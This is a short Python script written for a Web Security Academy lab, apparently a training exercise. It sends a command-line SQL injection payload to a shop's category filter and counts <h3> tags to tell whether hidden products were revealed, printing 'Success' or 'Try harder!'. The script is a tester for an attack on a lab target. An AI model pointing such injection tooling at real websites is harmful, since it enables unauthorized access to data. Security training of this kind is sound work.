import requests
import sys

#The homepage has 12 products wrapped in <h3> tags in the response body. 
#If we count more that 12 <h3> tags, it means we've successfully displayed hidden products. 

# declaring the url variable
url = "https://0aaf003c03d93fd2812c762a00890018.web-security-academy.net/"
# declaring the url path
uri = '/filter?category='
# payload = first argument passed as a string
payload = sys.argv[1]
# setting the response variable "response"
response= requests.get(url + uri + payload)
# response string used to verify if payload is valid
h3 = "<h3>"
#counting occurences of the opening h3 tag in the response body
count = response.text.count(h3)

#if h3 occures more than 12 times sql injection was successful
if count > 12:
    print("Success")
else:
    print("Try harder!")
